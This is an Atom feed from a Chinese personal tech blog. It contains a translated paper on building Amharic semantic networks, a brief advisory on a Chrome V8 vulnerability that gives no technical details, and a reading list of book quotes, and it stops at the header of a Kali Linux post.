<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ZHILI</title>
  
  <subtitle>WELCOME</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/zhililab/"/>
  <updated>2018-09-19T02:03:10.349Z</updated>
  <id>https://github.com/zhililab/</id>
  
  <author>
    <name>[object Object]</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>论文阅读 - 基于 Amharic WordNet 的语义网络自动构建研究</title>
    <link href="https://github.com/zhililab/2018/09/19/Paper1/"/>
    <id>https://github.com/zhililab/2018/09/19/Paper1/</id>
    <published>2018-09-18T16:00:00.000Z</published>
    <updated>2018-09-19T02:03:10.349Z</updated>
    
    <content type="html"><![CDATA[<p>本文翻译自《Automatic Construction of Amharic Semantic Networks From Unstructured Text Using Amharic WordNet》</p><p><img src="https://user-images.githubusercontent.com/11768073/45395067-de761480-b666-11e8-8640-3405b064f5cc.png" alt="image"></p><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>语义网络已成为许多自然语言处理应用程序中的关键部门。<strong>本文介绍了使用 Amharic WordNet 作为初始知识库的阿姆哈拉语义网络的自动构建研究</strong>，其中从给定文本中提取 WordNet 中的概念对之间的插入词模式以用于特定关系。对于我们知道 Amharic WordNet 中包含的关系的每对概念，我们在语料库中搜索这些概念之间的一些文本快照。返回的文本快照将被处理提取两个概念之间具有 n-gram 词的所有模式。我们使用用于提取语义相关概念的WordSpace 模型和这些概念之间的关系识别利用提取的文本模式。<strong>该系统旨在提取在语料库中流行并且频繁出现的概念之间的“部分”和“类型”关系</strong>。系统测试分为三个阶段，从新闻媒体收集文本语料库，并报告实验结果。</p><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1 介绍"></a>1 介绍</h2><p>语义网络是表示概念之间的语义关系的网络，通常用于表示知识。当知识被最好地理解为彼此相关的一组概念时，使用语义网络。概念是术语含义的抽象表征。一个术语可以由单词，短语，句子，段落或文档物理地表示。语义网络中最常用的概念之间的关系是同义词（相似的概念），反义词（相反的概念），meronym / holonym（概念之间的“part-of”关系）和 hyponym / hypernym（“type-of”关系）在概念之间）。作为语义网络存储的知识可以使用作为节点的概念和作为标记边缘的语义关系以图形（有向或无向）的形式表示（Fellbaum，1998; Steyvers和Tenenbaum，2005）。语义网络现在正成为流行的问题。尽管这种流行度主要与语义网的概念有关，但它也与自然语言处理（NLP）应用程序有关。语义网络允许搜索引擎不仅搜索用户给出的关键词，还搜索相关概念，并显示如何建立这种关系。作为语义网络存储的知识可以由从结构化数据生成文本的程序使用。语义网络还通过语义压缩数据和使用存储在其中的知识进行文档分类来用于文档摘要（Berners-Lee，2001; Sahlgren，2006; Smith，2003）。</p><p>通常用于自动构建语义网络的方法是基于知识，基于语料库和混合方法。 在基于知识的方法中，使用词库以监督方式提取两个概念之间的关系，而基于语料库的方法以半监督方法从大量文本中提取概念。 混合方法结合了语料库的层次结构和在大型语料库中测量的概念的统计信息（Dominic和Trevor，2010; George等，2010; Sahlgren，2006）。 在过去几年中，已经进行了多次尝试来开发语义网络。 众所周知的有 ASKNet（Harrington和Clark，2007），MindNet（Richardson等，1998）和Leximancer（Smith，2003）。 到目前为止构建的大多数语义网络都将英文文本假设为语料库。 但是，据我们所知，没有任何系统能够从非结构化的阿姆哈拉文本中自动构建语义网络。</p><p>本文从 <strong>无约束</strong> 和 <strong>非结构化</strong> 的阿姆哈拉语文本中自动构建语义网络。本文的其余部分安排如下： 第2节介绍阿姆哈拉语，强调其形态特征。 第3节讨论了阿姆哈拉语语义网络结构的设计。第4节介绍了实验结果，第5节重点介绍了结论和未来的工作。文章最后提供了参考文献。</p><h2 id="2-阿姆哈拉语"><a href="#2-阿姆哈拉语" class="headerlink" title="2 阿姆哈拉语"></a>2 阿姆哈拉语</h2><p>阿姆哈拉语是一种主要在埃塞俄比亚使用的闪米特语。目前，它是人口超过9000万的埃塞俄比亚国的工作语言。这种语言是埃塞俄比亚北部和中部地区大部分人口的母语，也是许多其他人的第二语言。它是世界上仅次于阿拉伯语的第二大语言闪族语言，也是整个埃塞俄比亚最常学到的第二语言（Lewis et al，2013）。阿姆哈拉语使用称为 fidel 的脚本编写，具有33个辅音（基本字符），其中表示每个字符的代表元音和辅音组合的六个其他字符。</p><p>阿姆哈拉语中词汇的衍生和变形是一个非常复杂的过程（Amare，2010; Yimam，2000）。阿姆哈拉名词和形容词因数字，性别，定义和实际情况而变化。另一方面，阿姆哈拉语名词可以源自：</p><ul><li>通过在辅音之间加入各种元音模式来获得语言根源，例如 መልስ（mäls/ answer）来自ምልስ（mls）;</li><li>形容词通过后缀各种类型的绑定语素，例如  ደግነት (dägĭnät/kindness) 来自 ደግ (däg/kind)；</li><li>通过为各种绑定语素添加前缀或后缀来实现，例如 e.g. ውጤት (wĭŃet/result) 来自<br>ውጥ- (wĭŃ-); </li><li>名词后缀各种约束语素，例如 ልጅነት (lĭjĭnät/childhood) 来自 ልጅ (lĭj/child)</li></ul><p>形容词也来自：</p><ul><li>通过在辅音之间加入元音来起源，例如 ጥቁር (Ńĭqur/black) 来自 ጥቅር (Ńqr);</li><li>通过后缀绑定语素的名词，例如 ጥቁር (Ńĭqur/black) 来自 ጥቅር (Ńqr); and</li><li>源于后缀的语素，例如 ደካማ (däkama/weak) 来自 ደካም- (dekam-).</li></ul><p>此外，名词和形容词可以从各种词汇类别的复合词中得出。阿姆哈拉语动词变形甚至比名词和形容词更复杂，因为动词被标记为人，性别，数字，案例，时态/方面和情绪的任何组合，导致从单个语言根合成数千个单词。关于推导过程，表面形式的几个动词来自单个动词词干，而几个词干来源于单个动词词根。例如，从口头根ስብር（sbr / to break），我们可以得出语言词干，例如ሰብር（säbr），ሰበር（säbär），ሳብር（sabr），ሰባብር（säbabr），ተሰባብር（täsäbabr）等。 我们可以得出诸如ሰበረው（säbäräw），ሰበርኩ（säbärku），ሰበረች（säbäräč），ሰበርን（säbärn），አሰበረ（assäbärä），ተሰበረ（täsäbärä），አልሰበረም（alsäbäräm），ሲሰበር（sisäbär），ሳይሰበር（sayäbär），ካልተሰበረ（kaltäsäbärä），የሚሰበር（yämisäbär）等。这导致一个单词代表用主语，动词和宾语构成的完整句子。由于这种形态复杂性，许多阿姆哈拉语自然语言处理应用需要使用词干分析器或形态分析器作为关键组件。</p><h2 id="3-提出的语义网络模型"><a href="#3-提出的语义网络模型" class="headerlink" title="3 提出的语义网络模型"></a>3 提出的语义网络模型</h2><p>（本文）提出的阿姆哈拉语义网络构建模型有以下主要组成部分：<strong>阿姆哈拉语 WordNet</strong>、<strong>文本分析和索引</strong>、<strong>计算术语向量</strong>、<strong>概念抽取和关系抽取</strong>。首先，提取表示文本语料库的索引术语。然后从索引文件计算术语向量并使用WordSpace 模型存储。通过搜索 WordSpace，为 Amharic WordNet 中的给定同义词集提取语义相关的概念。最后，使用来自阿姆哈拉语WordNet的概念对，从语料库中提取插入词语模式中的这些概念之间的关系。这些组件之间的过程关系如图1所示。</p><p><img src="https://user-images.githubusercontent.com/11768073/45406180-37aa6c00-b698-11e8-8a86-3a0f5bbc1c91.png" alt="image"></p><h3 id="3-1-阿姆哈拉语-WordNet"><a href="#3-1-阿姆哈拉语-WordNet" class="headerlink" title="3.1 阿姆哈拉语 WordNet"></a>3.1 阿姆哈拉语 WordNet</h3><p>为了从自由文本语料库中自动构建语义网络，我们需要一些系统的初始知识，以便可以提取其他未知的关系实例。因此，我们手工构建了阿姆哈拉语WordNet作为一个小知识库，其中术语之间的基本关系是“同义词”。阿姆哈拉语WordNet 由890个单词术语（全部是名词）组成，分为296个同义词组（同义词组），这些同义词组表示组中术语的概念。我们选择了名词概念，因为在名词之间检测到大多数关系类型。 动词和副词是关系指标，用于表示名词之间的关系。 通过称为“类型”，“部分”和“反义词”的其他三种关系，同步进一步相互关联。 然后使用Amharic WordNet为特定关系设置不同的种子。 一旦我们从WordNet准备了一组种子，我们就可以提取出表明这些种子对如何存在于语料库中的模式。 语料库中存在这些概念对的方式可以告诉我们关于语料库中其他概念对的更多信息。例如，语料库中存在{ኢትዮጵያ/Ethiopia，አፍሪካ/Africa}这两个术语的方式可以告诉我们，{ኬንያ/ Kenya，አፍሪካ/ Africa}这两个术语可以与前两个术语相同的方式存在。在一对术语{ኢትዮጵያ/Ethiopia，አፍሪካ/Africa}之间提取的模式可用于提取 ኬንያ/Kenya 等其他国家与 አፍሪካ/Africa 之间的关系。</p><h3 id="3-2-文本分析和索引"><a href="#3-2-文本分析和索引" class="headerlink" title="3.2 文本分析和索引"></a>3.2 文本分析和索引</h3><p>文本分析的过程始于从语料库中删除非字母标记和停用词。 接着是词语的词干，其中来自相同词素的几个词在进一步的步骤中被认为是相同的标记。 由于阿姆哈拉语是形态复杂的语言，因此找到词干的过程是一个艰巨的任务，这是词的最后一个不可改变的词素。 我们使用了 Alemayehu 和 Willet（2002）开发的 stemmer 算法的修改版本，它通过采用最小词干长度和上下文敏感规则迭代地删除后缀和前缀。 词干用作索引的术语，其通过应用术语频率逆文档频率加权算法来执行。</p><h3 id="3-3-计算术语向量"><a href="#3-3-计算术语向量" class="headerlink" title="3.3 计算术语向量"></a>3.3 计算术语向量</h3><p>术语向量是术语 - 权重对的序列。 在我们的案例中，该术语的权重是该术语与文档中其他术语的共现频率。 从索引文件计算术语向量，其中我们提取共同出现的术语并在 WordSpace 模型中计算术语向量。 从索引文件中，可以将索引映射到术语 - 上下文（术语 - 文档）矩阵，其中矩阵的单元格的值是上下文（文档）中术语的加权频率。 WordSpace模型用于通过使用随机投影算法减小矩阵的维度来从该矩阵语义创建术语向量（ Fern 和 Brodley，2003）。最后，WordSpace包含从语料库中找到的术语向量列表以及每个术语的共现频率。 用于计算术语向量的算法如图2所示。</p><p><img src="https://user-images.githubusercontent.com/11768073/45407196-47777f80-b69b-11e8-8f3c-6cd5b187a751.png" alt="image"></p><h3 id="3-4-概念抽取"><a href="#3-4-概念抽取" class="headerlink" title="3.4 概念抽取"></a>3.4 概念抽取</h3><p>从 WordSpace 模型中提取阿姆哈拉语 WordNet 的种子术语的语义相关概念，该模型用于创建术语向量的集合。每个术语向量包含不同的相关词及其共现频率。 对于来自阿姆哈拉语 WordNet 的概念作为 WordSpace 的输入，通过计算包含该概念的术语向量与 WordSpace 模型的剩余术语向量之间的余弦相似性来提取相关概念。对于WordSpace模型中的每个术语矢量 TVi 和对应于同义词库的术语矢量 TVx，余弦相似度C被计算为：</p><p><img src="https://user-images.githubusercontent.com/11768073/45407367-cd93c600-b69b-11e8-9d2d-8b59fcb2f42f.png" alt="image"></p><p>其中 n 是 WordSpace 模型中术语向量的数量。 由于 WordSpace 中术语向量的集合数量很多，我们使用余弦值按降序排列相关术语，以选择给定同义词库的前 k 个相关概念，其中 k 是我们用于确定数字的阈值要提取的相关概念。</p><h3 id="3-5-关系抽取"><a href="#3-5-关系抽取" class="headerlink" title="3.5 关系抽取"></a>3.5 关系抽取</h3><p>在这项工作中考虑的概念之间的关系是“部分”和“类型”。 我们使用半监督方法来提取关系，其中使用来自阿姆哈拉语 WordNet 的极少数种子实例或模式来进行引导学习。 这些种子与大型语料库一起使用以提取一组新模式，这些模式又用于以迭代方式提取更多实例。通常，使用阿姆哈拉语 WordNet 条目，从语料库中提取特定关系的插入词模式。对于我们知道阿姆哈拉语 WordNet 中包含的关系的每对概念（C1，C2），我们将查询 “C 1”+“C 2” 发送到语料库。处理返回的文本快照以提取与模式“C 1 X <em> C 2”匹配的所有 n-gram（其中 n 根据经验设置为2≤n≤7），其中 X 可以是最多五个空间的任意组合-分隔的单词或标点符号。因此，“C 1 X </em> C 2”是使用来自特定关系的Amharic WordNet的概念对（C 1，C 2）从语料库提取的模式。例如，假设阿姆哈拉语 WordNet 包含概念“ኢትዮጵያ（ityoPya / Ethiopia）”和“አማራ（amara / Amhara）”，其中 “ኢትዮጵያ/埃塞俄比亚” 是 “አማራ/ Amhara” 的上位词。 该方法将使用字符串“ኢትዮጵያ/ Ethiopia”+“አማራ/ Amhara”查询语料库。 让我们假设其中一个返回的文本快照是“……በኢትዮጵያከሚገኙክልሎችመካከልአማራሲሆንሲሆን…（…bä’ityoPyakämigäñukĭlĭločmäkakälamaraandu sihon …）”。这种模式将被添加到潜在的超级模式列表中，其中“ኢትዮጵያ/ Ethiopia”和“አማራ/ Amhara”被匹配的占位符替换，例如“var1ከሚገኙክልሎችመካከል（kämigäñukĭlĭločmäkakäl）var2”。提取模式后，最后一步是检测从WordSpace中提取的每对概念之间是否存在关系。 如果检测到一对概念之间的关系，则将概念对添加到网络中，其中每个概念是节点，并且链接是概念之间的关系。 图3显示了用于提取概念之间关系的算法。提取模式后，最后一步是检测从WordSpace中提取的每对概念之间是否存在关系。 如果检测到一对概念之间的关系，则将概念对添加到网络中，其中每个概念是节点，并且链接是概念之间的关系。 图3显示了用于提取概念之间关系的算法。</p><p><img src="https://user-images.githubusercontent.com/11768073/45408719-c40c5d00-b69f-11e8-8458-9599f5e01ef6.png" alt="image"></p><h2 id="4-实验"><a href="#4-实验" class="headerlink" title="4 实验"></a>4 实验</h2><h3 id="4-1-语料库收集"><a href="#4-1-语料库收集" class="headerlink" title="4.1 语料库收集"></a>4.1 语料库收集</h3><p>语料库由域独立，无约束和非结构化的文本数据组成。 它包含两组文本。 第一组是由 Walta 信息中心收集的新闻文本文档的集合（<code>1064</code>个新闻项目），所有新闻项目都用词性分类标记。这组数据集用于提取语料库中的概念。 第二组是从埃塞俄比亚国家通讯社收集的（<code>3261</code>条新闻）。 此数据集组用于计算从第一个标记数据集中提取的概念的频率。 因此，共收集了 <code>4325</code> 份阿姆哈拉新闻文件来建立语料库。</p><h3 id="4-2-实现"><a href="#4-2-实现" class="headerlink" title="4.2 实现"></a>4.2 实现</h3><p>通过从索引文件创建 WordSpace 来实现所提出的模型，该索引文件被映射到 词汇-文档 矩阵。 我们分别使用Apache Lucene 和 Semantic Vectors API 来索引和开发 WordSpace 模型。 使用 Java 也实现了概念和关系的提取。</p><h3 id="4-3-AMSNet"><a href="#4-3-AMSNet" class="headerlink" title="4.3 AMSNet"></a>4.3 AMSNet</h3><p>我们将 AMSNet 作为使用我们的阿姆哈拉语文本系统自动构建的语义网络的名称。AMSNet由一组概念和一组称为“同义词”，“部分”和“类型”的重要关系组成。它将条目保存为一阶谓词演算的形式，其中谓词是关系，参数是概念。 随着时间的推移，AMSNet 获取新概念，并在系统处理新文本文档时将每个新概念连接到现有邻域中的概念子集。不断增长的网络并不是一个完整的语义开发模型，而是包含可以在给定语料库的概念之间提取和连接的特定关系。语义网络不仅代表信息，还便于检索相关事实。例如，与概念“ኢትዮጵያ/ Ethiopia”相关的所有事实都存储有指向代表“ኢትዮጵያ/Ethiopia”的节点的指针。另一个例子涉及属性的继承。 鉴于“አገርሁሉመንግስትአለው（agär hulu mängĭst aläw/each country has a government）”这一事实，系统会自动断定“ኢትዮጵያመንግስትአላት（ityoPya mängĭst alat/ Ethiopia has a government）”，因为 ኢትዮጵያአገርናት（ ityoPya agär nat/Ethiopia is a country）。</p><h3 id="4-4-测试结果"><a href="#4-4-测试结果" class="headerlink" title="4.4 测试结果"></a>4.4 测试结果</h3><p>评估语义网络构建的结果没有黄金标准。 我们的结果由语言学家手动验证，并且根据他们的评估，从自由文本语料库中提取概念（同义词）之间的“类型”和“部分”关系的系统的平均准确度分别为 <code>68.5％</code> 和 <code>71.7％</code> 。 从我们的系统生成的样本结果如图4所示。</p><p><img src="https://user-images.githubusercontent.com/11768073/45410854-5ebb6a80-b6a5-11e8-87d1-e816568a123c.png" alt="image"></p><h2 id="5-总结和未来展望"><a href="#5-总结和未来展望" class="headerlink" title="5 总结和未来展望"></a>5 总结和未来展望</h2><p>（本文）在从自由文本语料库中识别和定义自动构建阿姆哈拉名词概念语义网络的正式步骤方面做了大量工作。 我们的语义网络的构建模型包括为收集的新闻文本语料库创建索引文件，基于索引文件开发 WordSpace，搜索 WordSpace 以生成给定的阿姆哈拉语 WordNet 术语的语义相关概念，使用阿姆哈拉语 WordNet 的条目生成特定关系的模式，并使用这些模式检测相关概念中的每对概念之间的关系。阿姆哈拉语语义网络的可用性有助于其他面向阿姆哈拉语的 NLP 应用（如信息检索，文档分类，机器翻译等）提高其性能。 未来的工作包括对阿姆哈拉语进行深入的形态分析，以及使用混合方法来改善系统的性能。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>Nega Alemayehu and Peter Willet. 2002. Stemming of Amharic Words for Information Retrieval, In Literary and Linguistic Computing, Vol 17, Issue 1,pp. 1-17.</p><p>Getahun Amare. 2010. ዘመናዊ የአማርኛ ሰዋስው በቀላልአቀራረብ (Modern Amharic Grammar in a Simple<br>Approach). Addis Ababa, Ethiopia</p><p>Tim Berners-Lee. 2001. The Semantic Web, Scientific American , Vol 284, Issue 5, pp. 34-43</p><p>Widdows Dominic and Cohen Trevor. 2010. The Semantic Vectors Package: New Algorithms and Public Tools for Distributional Semantics, In Fourth IEEE International Conference on Semantic Computing (IEEE ICSC2010). Carnegie Mellon University, Pittsburgh, PA, USA.</p><p>Christiane Fellbaum. 1998. WordNet: An Electronic Lexical Database. Cambridge, MIT Press</p><p>Tsatsaronis George, Iraklis Varlamis and Michalis Vazirgiannis. 2010. Text Relatedness Based on a<br>Word Thesaurus, Journal of Artificial Intelligence Research, vol. 37, pp. 1-39.</p><p>Brian Harrington and Stephen Clark. 2007. ASKNet: Automated Semantic Knowledge Network, In Proc. 22nd National Conf. on Artificial Intelligence, Vancouver, Canada. pp. 889-884</p><p>Paul Lewis, Gary Simons and Charles Fennig 2013; Ethnologue: Languages of the World, Seventeenth<br>edition. Dallas, Texas: SIL International.</p><p>Stephen Richardson, William Dolan and Lucy Vanderwende. 1998. MindNet: Acquiring and structuring semantic information from text, In Proceedings of the 17th COLING, Montreal, Canada. pp. 1098-<br>1102</p><p>Magnus Sahlgren. 2006. The Word-Space Model: Using distributional analysis to represent syntagmatic and paradigmatic relations between words in high-dimensional vector space. PhD Thesis, Stockholm University, Sweden.</p><p>Andrew Smith. 2003. Automatic Extraction of Semantic Networks from Text using Leximancer, In Proceedings of HLT-NAACL, Edmonton</p><p>Mark Steyvers and Joshua Tenenbaum. 2005. The Large-Scale Structure of Semantic Networks: Statistical Analyses and a Model of Semantic Growth, Cognitive Science, Vol 29, Issue 1, pp. 41–78</p><p>Xiaoli Fern and Carla Brodley. 2003. Random Projection for High Dimensional Data Clustering: A Cluster Ensemble Approach, In Proc. of the 20th Int. Conf. on Machine Learning (ICML-2003), Washington, DC.</p><p>Baye Yimam. 2000. የአማርኛ ሰዋስው (Amharic Grammar). Addis Ababa, Ethiopia</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文翻译自《Automatic Construction of Amharic Semantic Networks From Unstructured Text Using Amharic WordNet》&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-ima
      
    
    </summary>
    
      <category term="NLP" scheme="https://github.com/zhililab/categories/NLP/"/>
    
    
      <category term="语义网络" scheme="https://github.com/zhililab/tags/%E8%AF%AD%E4%B9%89%E7%BD%91%E7%BB%9C/"/>
    
      <category term="WordNet" scheme="https://github.com/zhililab/tags/WordNet/"/>
    
  </entry>
  
  <entry>
    <title>Chrome V8 引擎严重漏洞</title>
    <link href="https://github.com/zhililab/2018/06/08/Vulnerability-Chrome-V8/"/>
    <id>https://github.com/zhililab/2018/06/08/Vulnerability-Chrome-V8/</id>
    <published>2018-06-08T11:54:17.000Z</published>
    <updated>2018-06-09T02:13:52.429Z</updated>
    
    <content type="html"><![CDATA[<p><strong>0x1 概况</strong></p><p>​    今天下午，腾讯安全应急响应中心（TSRC）在新浪微博上公开感谢360阿尔法团队（截图如下），感谢360阿尔法团队提交给TSRC漏洞报告。该报告指出 —— “ Chrome 使用的 V8 引擎暴露一处严重漏洞，利用此漏洞可以实现远程任意代码执行，部分系统 Webview 的APP以及手机系统可能都会受到影响。 该漏洞可能会影响腾讯旗下的部分产品。”</p><p><img src="https://cl.ly/1s1G2x402p2B/Image%202018-06-08%20at%208.56.15%20PM.png" alt=""></p><p>​    <center><strong>图 1 致谢截图</strong></center></p><p>​    Chrome V8 是 Google 开源的高性能 JavaScript 引擎，它底层采用 C++ 编写，实现了 ECMAScript 规范的第五版。它可以运行在所有主流的操作系统，甚至移动终端中，虽然其最早是随着 Chrome 浏览器一起发布的，但其可以作为独立的模块，嵌入开发者自己的应用当中，例如：著名的 Node.js 就是基于 V8 引擎的。现在使用十分广泛，包括腾讯在内的很多互联网公司都有使用。</p><blockquote><p><strong>ECMAScript</strong> 是一种由 ECMA 国际(前身为欧洲计算机制造商协会,英文名称是European Computer Manufacturers Association)通过ECMA-262标准化的脚本程序设计语言。JavaScript 是ECMAScript 发布以来最知名的实现语言，其他实现还有 JScript 和 ActionScript。截止到目前，ECMAScript 一共累计发布了 8 个版本。</p></blockquote><p><strong>0x2 威胁等级（高危）</strong></p><p>※ 危害评估：★★★★☆ </p><p>利用此次曝出的漏洞，恶意攻击者可以实现远程任意代码执行，危害程度较大。</p><p>※ 影响评估：★★★☆☆ </p><p>主要威胁部分系统 Webview 的 App 以及手机操作系统</p><p><strong>0x3 技术细节</strong></p><p>​    腾讯安全响应中心（TSRC）收到此报告后第一时间推动业务团队进行修复工作，现已修复漏洞并启动紧急在线更新机制。具体漏洞技术细节，360 阿尔法团队和腾讯团队尚未公开。</p><p><strong>0x4 安全建议</strong></p><p>1.建议用户通过官方渠道下载安装<strong>最新版</strong>各类腾讯 App，安卓用户推荐使用：应用宝、豌豆荚；iOS 用户建议通过苹果 App Store 下载安装。</p><p>2.此外，推荐使用腾讯手机管家、360手机安全卫士，为您的手机系统和应用安全保驾护航。</p><p><strong>0x5 附录</strong></p><ol><li>Chrome V8 | Google Developers <a href="https://developers.google.com/v8/" target="_blank" rel="noopener">https://developers.google.com/v8/</a></li><li>Chrome V8 引擎入门 <a href="https://blog.csdn.net/xyqzki/article/details/45745507" target="_blank" rel="noopener">https://blog.csdn.net/xyqzki/article/details/45745507</a></li><li>使用 Google V8 引擎开发可定制的应用程序 <a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-v8engine/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/opensource/os-cn-v8engine/index.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;0x1 概况&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​    今天下午，腾讯安全应急响应中心（TSRC）在新浪微博上公开感谢360阿尔法团队（截图如下），感谢360阿尔法团队提交给TSRC漏洞报告。该报告指出 —— “ Chrome 使用的 V8 引擎暴露一处严重
      
    
    </summary>
    
      <category term="技术" scheme="https://github.com/zhililab/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="威胁情报" scheme="https://github.com/zhililab/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
      <category term="漏洞" scheme="https://github.com/zhililab/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>书单：2018年4月-5月</title>
    <link href="https://github.com/zhililab/2018/06/01/Reading-Books-April-to-May-2018/"/>
    <id>https://github.com/zhililab/2018/06/01/Reading-Books-April-to-May-2018/</id>
    <published>2018-05-31T16:00:00.000Z</published>
    <updated>2018-06-09T02:06:45.486Z</updated>
    
    <content type="html"><![CDATA[<p>Cover Photo by Kingston Chen on Unsplash</p><p>我的2018年4月-5月的 Kindle 书目一览（含Knotes）：</p><p><strong>0x1《黑客与画家》，我的推荐指数：★★★☆☆</strong></p><ul><li><p>“黑客行为必须包含三个特点：<strong>好玩</strong>、<strong>高智商</strong>、<strong>探索精神</strong>。”</p></li><li><p>“任何一种艺术，不管是否重要，如果你想要在该领域出类拔萃，就必须全身心投入。”</p></li><li><p>“创造优美事物的方式往往不是从头做起，而是在<strong>现有成果的基础上</strong>做一些小小的调整，或者将<strong>已有的观点</strong>用比较新的方式组合起来。”</p></li><li><p>“判断一个人是否具备<strong>“换位思考”</strong>的能力有一个好方法，那就是看他怎样向没有技术背景的人解释技术问题。” </p><blockquote><p><strong>TO ME: </strong>客户体验很重要！</p></blockquote></li></ul><p><strong>0x2《我在故宫修文物》，我的推荐指数：★★★★★ </strong></p><ul><li><p>“大历史，小工匠。择一事，终一生。”</p></li><li><p>“没有人告诉过我们，生活到底应该过成什么样。”</p><blockquote><p><strong>TO ME:</strong> 我的生活由我自己定义 💪</p></blockquote></li><li><p>“修理这东西师父也没法说这个应该怎么干，那个应该怎么干，关键还是自己动手，自己体会。”</p><blockquote><p><strong>TO ME: </strong>看千遍万遍，不如自己实际动手实践一次，有些东西得考自己通过不断实践尝试，思考领悟 ~</p></blockquote></li><li><p>“师傅领进门，修行靠个人。” </p><blockquote><p><strong>TO ME: </strong> 没错，“名师会出高徒”，但真正带领自己最后走向高峰的还是自己。因为师傅传授我们更多的是经验和解决问题的思路，让我们尽量少“踩坑”，但技术是门工具，五花八门，具体场景如何选择、改进，还是需要靠自己亲身实践、总结反思、再实践反思… </p></blockquote></li><li><p>“我修过的文物，我都喜爱，你必须得喜爱，要不喜爱，你就对它不珍惜，干出的活也不会太漂亮。”</p><blockquote><p><strong>TO ME: </strong>我喜爱自己写出的每一行 code ，它是 secure，meeting the standards/norms，human-readable，robust，high-performance…</p></blockquote></li><li><p>”看似枯燥的磨刀刮纸基本功训练都有其背后的另一层含义，养成的是职业习惯，改变的是浮躁心态。”</p></li><li><p>“任何人没有义务教你,珍惜每一个指导你的人。”</p><blockquote><p><strong>TO ME: </strong>珍惜<strong>生活</strong> 🏃‍、<strong>学习</strong> 📕、<strong>工作</strong> 👨‍💻 中帮助我的每一个人 👩，怀揣感恩之心 💗💗💗</p></blockquote></li><li><p>”要学会在看似平淡重复枯燥的工作中仔细体会、思考,时刻想着如何用上过去的经历、经验,如何把这次工作经历迁移运用到下次工作中去。如果连做工作本身的都老想着工作反复、枯燥bulabula,那也蹦指望你能能弄出名堂 ~ “</p><blockquote><p><strong>TO ME: </strong>犯错并不可怕，ヽ(*。&gt;Д&lt;)o゜可怕的是一次次重复上次的错误 ❌</p></blockquote></li><li><p>“刚来时冯老师说，你别上来蒙头就画，你得先读读那画，先看几天，就天天看。看的时候，心里想着点，这张画，他是怎么画的，我要想临摹，我怎么画，我先画哪儿，后画哪儿。有的时候，你还可以画一个小的局部，临一下看一看。“</p><blockquote><p><strong>TO ME: </strong>阅读别人写的优秀代码时，可以反复看上几篇，了解整个架构、模块分布，层次关系，🤔 思考别人这么写的原因，在完全弄明白之后；然后，开始思考别人代码有什么可以改进的地方、这么写可能会引发什么 bug，是否存在安全漏洞等等；最后，可以把自己的 阅读 – 思考 – 反思 – 循环➰ 的过程记录下来 ✍</p></blockquote></li><li><p>“我觉得现在就应该是积累和学习的状态，如果现在就要如何如何，一方面是过于求成，另一方面本身技术还不好，你前期不扎实，后期通过其它手段，就是做起来也是不稳的。”</p></li><li><p>“反正干我们这行别偷懒，你干的越少越不行。就得多干，你没悟性的必须得多干，才能找出这个感觉来。”</p></li></ul><p><strong>0x3《社会工程：安全体系中的人性漏洞》，我的推荐指数：★★★★☆</strong></p><p><strong>0x4《趁一切来得及，做自己喜欢的事》，我的推荐指数：★★★★☆ </strong></p><ul><li>“情怀是一种能够感染人、触动人的感情。“</li><li>“热爱是一种能力、一种修养，更是一种让生命产生价值和乐趣的信仰。”</li><li>”失和得从来都不是割裂的，它们就像是一对孪生兄弟。“</li><li>”分享的重要意义是参与分享的各方都能得以成长。“</li><li>”因为我们在此岸，别人在彼岸，环境不同，造就了不同的风景，我们此岸没有他们彼岸那样的风景，所以我们就去羡慕别人。“</li><li>”对一个真正有追求的人来说，生命的每个时期都是年轻的、及时的。“</li><li>”爱情真好，遇到真正喜欢的人要努力争取和他相伴。| 知己不易，遇到可信赖的人要好好和他相处。| 机会难得，遇到贵人要好好感谢他。| 回忆珍贵，遇到匆匆离开的人要记住他。“</li><li>”不急，不浮，不躁，不愚，不直。“</li><li>”再小的温柔，只要你细心去察觉、用心去体会，它也能成为你心灵中柔软而宝贵的部分。“</li></ul><p><img src="https://cl.ly/073u0i310Z2I/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20180608220418.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Cover Photo by Kingston Chen on Unsplash&lt;/p&gt;
&lt;p&gt;我的2018年4月-5月的 Kindle 书目一览（含Knotes）：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0x1《黑客与画家》，我的推荐指数：★★★☆☆&lt;/strong&gt;&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="读书" scheme="https://github.com/zhililab/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
      <category term="读书" scheme="https://github.com/zhililab/tags/%E8%AF%BB%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>Kali Linux</title>
    <link href="https://github.com/zhililab/2018/05/02/Security-Install-KaliLinux/"/>
    <id>https://github.com/zhililab/2018/05/02/Security-Install-KaliLinux/</id>
    <published>2018-05-02T02:00:00.000Z</published>
    <updated>2018-06-04T05:04:48.331Z</updated>
    
